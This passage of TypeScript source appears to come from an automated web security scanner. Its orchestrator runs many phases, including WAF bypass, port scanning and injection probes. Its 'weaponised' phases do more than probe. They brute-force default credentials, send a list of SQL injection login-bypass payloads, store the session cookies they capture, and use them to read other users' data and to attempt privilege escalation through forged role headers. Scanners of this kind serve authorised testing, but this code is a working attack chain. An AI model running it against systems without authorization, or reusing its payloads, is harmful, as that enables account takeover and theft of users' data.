          evidence: `LOGIN URL: ${loginUrl}\nCREDENTIALS: ${username}:${password}\nHTTP RESPONSE: ${r.status}\nSESSION COOKIE (masked): ${masked}\nAUTH SIGNALS: ${['log out', 'logout', 'dashboard', 'account', 'welcome'].filter((s) => bodyLower.includes(s)).join(', ') || 'HTTP redirect'}`,
          remediation: 'Change all default credentials immediately.',
        });
        await onLog(
          `[${ts()}] ⚠ CRITICAL: Default credentials CONFIRMED — ${username}:${password} at ${loginUrl} (${masked})`,
        );
        return findings;
      }
    }
    await onLog(`[${ts()}] [Phase 25] No default credentials accepted at ${loginUrl}`);
    break;
  }
  return findings;
}

const SQLI_AUTH_PAYLOADS: { username: string; password: string; note: string }[] = [
  { username: "' OR '1'='1", password: 'anything', note: 'classic OR bypass' },
  { username: "' OR '1'='1' --", password: 'anything', note: 'OR bypass with comment' },
  { username: "admin'--", password: 'anything', note: 'admin comment bypass' },
  { username: "admin'/*", password: 'anything', note: 'admin block-comment' },
  { username: "' OR 1=1--", password: 'anything', note: 'numeric OR bypass' },
  { username: "') OR ('1'='1", password: 'anything', note: 'parenthesis bypass' },
  { username: "admin' #", password: 'anything', note: 'MySQL hash bypass' },
  { username: "' OR 'x'='x", password: "' OR 'x'='x", note: 'full double-bypass' },
];

async function checkSqliAuthBypass(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 26] Testing SQL injection authentication bypass...`);
  const loginPaths = [
    '/rest/Session/login',
    '/login',
    '/signin',
    '/sign-in',
    '/admin/login',
    '/admin',
    '/user/login',
  ];
  const AUTH_SIGNALS = [
    'log out',
    'logout',
    'dashboard',
    'welcome',
    'account',
    'admin panel',
    'control panel',
  ];
  const FAIL_SIGNALS = ['invalid', 'incorrect', 'error', 'failed', 'wrong'];

  for (const loginPath of loginPaths.slice(0, 4)) {
    if (!activeProbesAllowed()) break;
    const loginUrl = target.url.replace(/\/$/, '') + loginPath;
    const pageRes = await probe(loginUrl, { timeoutMs: 8_000 });
    if (!pageRes || pageRes.status === 404) continue;
    const hasLoginForm =
      /<form[^>]*>/i.test(pageRes.body) && /type=['"]?password['"]?/i.test(pageRes.body);
    if (!hasLoginForm) continue;

    await onLog(`[${ts()}] [Phase 26] Testing SQLi bypass payloads at ${loginUrl}...`);
    const csrfMatch = pageRes.body.match(
      /(?:name=['"]_?(?:csrf|token|authenticity_token|_token)['"]\s+value=['"]([^'"]+)['"]|value=['"]([^'"]+)['"]\s+name=['"]_?(?:csrf|token|authenticity_token|_token)['"])/i,
    );
    const csrfToken = csrfMatch ? (csrfMatch[1] ?? csrfMatch[2] ?? null) : null;
    const pageCookies = pageRes.headers['set-cookie'] ?? '';
    const cookieHeader = pageCookies
      .split(',')
      .map((c) => c.split(';')[0]!.trim())
      .filter(Boolean)
      .join('; ');

    for (const { username, password, note } of SQLI_AUTH_PAYLOADS) {
      if (!activeProbesAllowed()) break;
      const fields: Record<string, string> = {
        username,
        user: username,
        email: username,
        login: username,
        password,
        pass: password,
        ...(csrfToken ? { _token: csrfToken, csrf_token: csrfToken } : {}),
      };
      const formBody = Object.entries(fields)
        .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
        .join('&');

      const r = await probe(loginUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          Referer: loginUrl,
          ...(cookieHeader ? { Cookie: cookieHeader } : {}),
        },
        body: formBody,
        timeoutMs: 10_000,
        followRedirects: true,
      });
      if (!r) continue;
      const bodyLower = r.body.toLowerCase();
      const sessionCookie = extractSessionCookie(r.headers['set-cookie'] ?? '');
      const hasFail = FAIL_SIGNALS.some((s) => bodyLower.includes(s));
      const hasAuth = AUTH_SIGNALS.some((s) => bodyLower.includes(s));

      if (sessionCookie && !hasFail && (hasAuth || r.status === 302)) {
        const masked = sessionCookie.slice(0, 12) + '****' + sessionCookie.slice(-4);
        storeCapturedSession(sessionCookie);
        findings.push({
          title: 'SQL Injection Authentication Bypass — Login as Administrator',
          severity: 'critical',
          verification: 'verified',
          confidence: 92,
          cvss: 9.8,
          cve: null,
          description: `SQLi payload '${username}' (${note}) bypassed login at ${loginUrl}.`,
          evidence: `LOGIN URL: ${loginUrl}\nSQLi PAYLOAD: ${username}\nHTTP RESPONSE: ${r.status}\nSESSION COOKIE (masked): ${masked}\nAUTH SIGNALS: ${AUTH_SIGNALS.filter((s) => bodyLower.includes(s)).join(', ') || 'HTTP redirect'}`,
          remediation: 'Use parameterised queries.',
        });
        await onLog(`[${ts()}] ⚠ CRITICAL: SQLi auth bypass CONFIRMED at ${loginUrl}`);
        return findings;
      }
    }
    break;
  }
  await onLog(`[${ts()}] [Phase 26] No SQL injection auth bypass confirmed`);
  return findings;
}

async function checkIdorWithCapturedSession(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const capturedSession = getCapturedSession();
  if (!capturedSession || !activeProbesAllowed()) return findings;

  await onLog(`[${ts()}] [Phase 28] Testing IDOR / privilege escalation using captured session...`);
  const cookieHeader = capturedSession;
  const ADMIN_PATHS = [
    '/admin',
    '/admin/dashboard',
    '/admin/users',
    '/api/admin',
    '/api/admin/users',
  ];
  const AUTH_PATHS = [
    '/profile',
    '/settings',
    '/account',
    '/dashboard',
    '/user',
    '/me',
    '/api/user',
    '/api/profile',
    '/api/me',
    '/api/account',
  ];

  // Role escalation via headers
  for (const adminPath of ADMIN_PATHS.slice(0, 3)) {
    if (!activeProbesAllowed()) break;
    const adminUrl = target.url.replace(/\/$/, '') + adminPath;
    const [normalRes, escalatedRes] = await Promise.all([
      probe(adminUrl, { headers: { Cookie: cookieHeader }, timeoutMs: 8_000 }),
      probe(adminUrl, {
        headers: {
          Cookie: cookieHeader,
          'X-Admin': 'true',
          Role: 'admin',
          'X-User-Role': 'admin',
          'X-Forwarded-User': 'admin',
        },
        timeoutMs: 8_000,
      }),
    ]);
    if (
      normalRes &&
      escalatedRes &&
      (normalRes.status === 403 || normalRes.status === 401) &&
      escalatedRes.status === 200 &&
      escalatedRes.body.length > 200
    ) {
      findings.push({
        title: 'Privilege Escalation via Admin Headers — Unauthorized Admin Access',
        severity: 'critical',
        verification: 'suspected',
        confidence: 72,
        cvss: 9.1,
        cve: null,
        description: `Admin endpoint ${adminUrl} accessible with role headers.`,
        evidence: `NORMAL: HTTP ${normalRes.status}\nESCALATED: HTTP ${escalatedRes.status}`,
        remediation: 'Never trust client-supplied role headers.',
      });
      await onLog(`[${ts()}] ⚠ CRITICAL: Privilege escalation via admin headers at ${adminUrl}`);
      return findings;
    }
  }

  // IDOR: cross-user data access
  for (const authPath of AUTH_PATHS.slice(0, 6)) {
    if (!activeProbesAllowed()) break;
    const authUrl = target.url.replace(/\/$/, '') + authPath;
    const r = await probe(authUrl, { headers: { Cookie: cookieHeader }, timeoutMs: 8_000 });
    if (!r || r.status === 404 || r.status === 401 || r.status === 403) continue;

    const numericIds = [
      ...r.body.matchAll(/"(?:id|user_id|userId|account_id|accountId|order_id|orderId)":\s*(\d+)/g),
    ].map((m) => parseInt(m[1]!));
    if (numericIds.length === 0) continue;
    const myId = numericIds[0]!;
    const myEmail = r.body.match(/"email":\s*"([^"]+)"/)?.[1];
    const myName = r.body.match(/"(?:name|username)":\s*"([^"]+)"/)?.[1];

    for (const testId of [myId - 1, myId + 1]) {
      const testUrls = [
        `${target.url}api/user/${testId}`,
        `${authUrl}/${testId}`,
        `${authUrl}?id=${testId}`,
      ];
      for (const url of testUrls) {
        const idRes = await probe(url, { headers: { Cookie: cookieHeader }, timeoutMs: 8_000 });
        if (!idRes || idRes.status === 404 || idRes.status === 403) continue;
        const testEmail = idRes.body.match(/"email":\s*"([^"]+)"/)?.[1];
        const testName = idRes.body.match(/"(?:name|username)":\s*"([^"]+)"/)?.[1];
        if (
          (myEmail && testEmail && myEmail !== testEmail) ||
          (myName && testName && myName !== testName)
        ) {
          findings.push({
            title: 'IDOR — Cross-User Data Access via Direct Object Reference',
            severity: 'high',
            verification: 'verified',
            confidence: 90,
            cvss: 8.1,
            cve: null,
            description: `Accessing object ID ${testId} returned data for a different user.`,
            evidence: `MY ID: ${myId} → email=${myEmail}\nACCESSED ID: ${testId} → email=${testEmail}`,
            remediation: 'Verify object ownership on every data access.',
          });
          await onLog(`[${ts()}] ⚠ HIGH: IDOR confirmed — accessed user ${testId} data`);
          return findings;
        }
      }
    }
  }
  await onLog(`[${ts()}] [Phase 28] No cross-user data access confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// MAIN ORCHESTRATOR (WEAPONISED)
// ═══════════════════════════════════════════════════════════════════════════════

export async function scanTarget(
  value: string,
  assetType: string,
  scanType: ScanType,
  onLog: LogFn,
  policy: ScanPolicy = resolveScanPolicy('safe_active'),
  authHeaders?: Record<string, string>,
): Promise<ScanResult> {
  const target = normalizeTarget(value, assetType);
  if (!target) {
    await onLog(`[${ts()}] ERROR: Cannot normalise target "${value}" — skipping`);
    return { findings: [], wafBlocked: false };
  }

  // Apply origin override if set
  if (policy.originOverride) {
    const origHost = target.hostname;
    target.hostname = policy.originOverride;
    target.url = target.url.replace(`://${origHost}`, `://${policy.originOverride}`);
    await onLog(
      `[${ts()}] Origin override active — all requests routed to ${policy.originOverride} with Host: ${origHost}`,
    );
  }

  return scanContext.run(
    {
      remaining: policy.requestBudget,
      verificationRemaining: policy.verificationRequestBudget,
      exhaustedNotified: false,
      authHeaders,
      wafChallengeDetected: false,
      wafChallengeLogEmitted: false,
      activeProbeDepth: 0,
      onWafChallenge: () =>
        onLog(
          `[${ts()}] WAF challenge page detected — active probes suspended; only passive/informational checks running.`,
        ),
    },
    async () => {
      const all: RealFinding[] = [];
      const add = (f: RealFinding[]) => {
        all.push(...f);
      };

      await onLog(`[${ts()}] ═══════════════════════════════════════`);
      await onLog(`[${ts()}] TARGET  : ${target.url}`);
      await onLog(`[${ts()}] HOST    : ${target.hostname}`);
      await onLog(`[${ts()}] SCAN    : FULL DEEP SCAN / PROFILE ${policy.profile.toUpperCase()}`);
      await onLog(
        `[${ts()}] POLICY  : ${policy.requestBudget} request budget · ${policy.timeoutMs}ms timeout · concurrency ${policy.maxConcurrency}`,
      );
      await onLog(
        `[${ts()}] TOOLS   : nmap · dig · whois · openssl · fetch · crt.sh · ipinfo.io · Wayback`,
      );
      if (authHeaders && Object.keys(authHeaders).length > 0) {
        await onLog(
          `[${ts()}] AUTH    : Authenticated scanning enabled (${Object.keys(authHeaders).join(', ')})`,
        );
      } else {
        await onLog(`[${ts()}] AUTH    : Unauthenticated scan`);
      }
      await onLog(`[${ts()}] ═══════════════════════════════════════`);

      // Phase 1: WAF detection and bypass
      await onLog(`[${ts()}] [Phase 1] WAF/CDN detection and bypass testing...`);
      const { findings: wafFindings } = await runActiveChecks(
        () => checkWafAndBypass(target, onLog),
        { findings: [], wafName: null },
      );
      add(wafFindings);

      // Phase 2: DNS enumeration
      await onLog(`[${ts()}] [Phase 2] DNS enumeration (dig)...`);
      add(await checkDns(target.hostname, onLog));

      // Phase 3: IP geolocation & ASN
      await onLog(`[${ts()}] [Phase 3] IP geolocation & ASN intelligence...`);
      await getIpInfo(target.hostname, onLog);

      // Phase 4: WHOIS
      if (assetType !== 'ip') {
        await onLog(`[${ts()}] [Phase 4] WHOIS domain intelligence...`);
        add(await checkWhois(target.hostname, onLog));
      }

      // Phase 5: Subdomain discovery + takeover
      let discoveredSubs: string[] = [];
      if (assetType !== 'ip') {
        await onLog(`[${ts()}] [Phase 5] Subdomain discovery...`);
        const { findings: subFindings, subs } = await discoverSubdomains(target.hostname, onLog);
        add(subFindings);
        discoveredSubs = subs;
        await onLog(`[${ts()}] Total subdomains in scope: ${subs.length}`);
        await onLog(`[${ts()}] [Phase 5b] Subdomain takeover detection...`);
        add(await runActiveChecks(() => checkSubdomainTakeover(discoveredSubs, onLog), []));
      }

      // Phase 6: Port scanning
      await onLog(`[${ts()}] [Phase 6] Full port scanning with nmap...`);
      add(await runActiveChecks(() => checkPorts(target.hostname, 'full', onLog), []));

      // Phase 7: TLS/SSL analysis
      if (target.isHttps) {
        await onLog(`[${ts()}] [Phase 7] TLS/SSL analysis...`);
        add(await checkTls(target.hostname, target.port, onLog));
      }

      // Phase 8: HTTP security headers
      await onLog(`[${ts()}] [Phase 8] HTTP security header analysis...`);
      add(await checkHeaders(target, onLog));

      // Phase 9: Technology fingerprinting
      await onLog(`[${ts()}] [Phase 9] Technology fingerprinting...`);
      const { techs, findings: fpFindings } = await fingerprint(target, onLog);
      add(fpFindings);
      if (techs.length > 0)
        await onLog(
          `[${ts()}] Stack detected: ${techs.map((t) => `${t.name} (${t.category})`).join(' · ')}`,
        );

      // Phase 10: Sensitive path discovery
      await onLog(`[${ts()}] [Phase 10] Sensitive path discovery...`);
      add(await runActiveChecks(() => checkSensitivePaths(target, true, onLog), []));

      // Phase 11: Wayback Machine
      await onLog(`[${ts()}] [Phase 11] Wayback Machine...`);
      add(await checkWayback(target.hostname, onLog));

      // Phase 12: Web app probes (SQLi, XSS, NoSQL, CMDi, redirects, methods)
      await onLog(`[${ts()}] [Phase 12] Web app probes...`);
      add(await runActiveChecks(() => checkWebApp(target, onLog), []));

      // Phase 13: API surface
      await onLog(`[${ts()}] [Phase 13] API surface discovery...`);
      add(await runActiveChecks(() => checkApiSurface(target, onLog), []));

      // Phase 14: Host header injection
      await onLog(`[${ts()}] [Phase 14] Host header injection...`);
      add(await runActiveChecks(() => checkHostHeaderInjection(target, onLog), []));

      // Phase 15: CRLF injection
      await onLog(`[${ts()}] [Phase 15] CRLF injection...`);
      add(await runActiveChecks(() => checkCrlfInjection(target, onLog), []));

      // Phase 16: Path traversal
      await onLog(`[${ts()}] [Phase 16] Path traversal...`);
      add(await runActiveChecks(() => checkPathTraversal(target, onLog), []));

      // Phase 17: JWT weaknesses
      await onLog(
        `[${ts()}] [Phase 17] JWT algorithm, secret weakness, and advanced attack suite...`,
      );
      add(await runActiveChecks(() => checkJwtWeaknesses(target, onLog), []));

      // Phase 18: IDOR / BOLA
      await onLog(`[${ts()}] [Phase 18] IDOR / Broken Object-Level Access Control...`);
      add(await runActiveChecks(() => checkIdorAndBola(target, onLog), []));

      // Phase 19: HTTP request smuggling
      await onLog(`[${ts()}] [Phase 19] HTTP request smuggling...`);
      add(await runActiveChecks(() => checkHttpRequestSmuggling(target, onLog), []));

      // Phase 20: Log4Shell / Spring4Shell surface
      await onLog(`[${ts()}] [Phase 20] Log4Shell/Spring4Shell surface...`);
      add(await runActiveChecks(() => checkLog4ShellSurface(target, onLog), []));

      // Phase 21: Rate limiting absence
      await onLog(`[${ts()}] [Phase 21] Rate limiting / brute-force protection check...`);
      add(await runActiveChecks(() => checkRateLimiting(target, onLog), []));

      // Phase 22: Advanced probes (SSTI, XXE, SSRF, Deserialization, CMDi, NoSQL) — from vuln-probes.ts
      await onLog(
        `[${ts()}] [Phase 22] Advanced probes — SSTI · XXE · SSRF · Deserialization · CMDi · NoSQL...`,
      );
      const {
        checkSSTI,
        checkXXE,
        checkSSRF,
        checkDeserialization,
        checkCommandInjection,
        checkNoSqlInjection,
        lookupCvesForTechs,
      } = await import('./vuln-probes');
      add(
        await runActiveChecks(async () => {
          const advancedFindings: RealFinding[] = [];
          if (checkSSTI) advancedFindings.push(...(await checkSSTI(target, onLog)));
          if (checkXXE) advancedFindings.push(...(await checkXXE(target, onLog)));
          if (checkSSRF) advancedFindings.push(...(await checkSSRF(target, onLog)));
          if (checkDeserialization)
            advancedFindings.push(...(await checkDeserialization(target, onLog)));
          if (checkCommandInjection)
            advancedFindings.push(...(await checkCommandInjection(target, onLog)));
          if (checkNoSqlInjection)
            advancedFindings.push(...(await checkNoSqlInjection(target, onLog)));
          return advancedFindings;
        }, []),
      );

      // Phase 23: CVE database lookup
      await onLog(`[${ts()}] [Phase 23] CVE database lookup...`);
      add(await lookupCvesForTechs(techs, onLog));

      // ── WEAPONISED PHASES (only when allowVerification is true) ──
      if (policy.allowVerification) {
        await onLog(`[${ts()}] [Phase 24] Unsecured registration exploitation...`);
        add(await checkOpenRegistration(target, onLog));

        await onLog(`[${ts()}] [Phase 25] Default credential brute-force...`);
        add(await checkDefaultCredentials(target, onLog));

        await onLog(`[${ts()}] [Phase 26] SQLi authentication bypass...`);
        add(await checkSqliAuthBypass(target, onLog));

        if (getCapturedSession()) {
          await onLog(`[${ts()}] [Phase 28] IDOR with captured session...`);
          add(await checkIdorWithCapturedSession(target, onLog));
        }
      }

      suppressWafSensitiveFindings(all);
      downgradeWafChallengeFindings(all);
      applyComplianceMapping(all);

      // ── Summary ──
      const reportable = all.filter((f) => f.cvss > 0 || f.severity !== 'low');
      const bySeverity = { critical: 0, high: 0, medium: 0, low: 0 };
      for (const f of reportable) {
        if (f.severity in bySeverity) bySeverity[f.severity as keyof typeof bySeverity]++;
      }

      const riskGrade =
        bySeverity.critical > 0
          ? 'F'
          : bySeverity.high >= 3
            ? 'D'
            : bySeverity.high >= 1
              ? 'C'
              : bySeverity.medium >= 3
                ? 'C'
                : bySeverity.medium >= 1
                  ? 'B'
                  : reportable.length === 0
                    ? 'A'
                    : 'B';

      const top3 = reportable
        .slice()
        .sort((a, b) => (b.cvss ?? 0) - (a.cvss ?? 0))
        .slice(0, 3)
        .map((f) => `  • ${f.title} (CVSS ${f.cvss}, ${f.severity.toUpperCase()})`)
        .join('\n');

      await onLog(`[${ts()}] ═══════════════════════════════════════`);
      await onLog(`[${ts()}] SCAN COMPLETE — EXECUTIVE SUMMARY`);
      await onLog(`[${ts()}] Risk Grade : ${riskGrade}`);
      await onLog(
        `[${ts()}] Total findings : ${reportable.length} (C:${bySeverity.critical} H:${bySeverity.high} M:${bySeverity.medium} L:${bySeverity.low})`,
      );
      await onLog(
        `[${ts()}] Requests used: ${policy.requestBudget - (remainingScanRequests() ?? 0)}/${policy.requestBudget}`,
      );
      const verified = reportable.filter((f) => f.verified || f.verification === 'verified');
      await onLog(
        `[${ts()}] Verified vulnerabilities: ${verified.filter((f) => f.severity === 'critical').length} critical, ${verified.filter((f) => f.severity === 'high').length} high (${verified.length} total)`,
      );
      if (top3) {
        await onLog(`[${ts()}] Top findings by CVSS:`);
        await onLog(top3);
      }
      await onLog(
        `[${ts()}] Compliance: OWASP Top 10 · PCI DSS v4.0 · NIST 800-53 mapped to findings`,
      );
      await onLog(`[${ts()}] ═══════════════════════════════════════`);

      return { findings: reportable, wafBlocked: isWafChallengeDetected() };
    },
  );
}
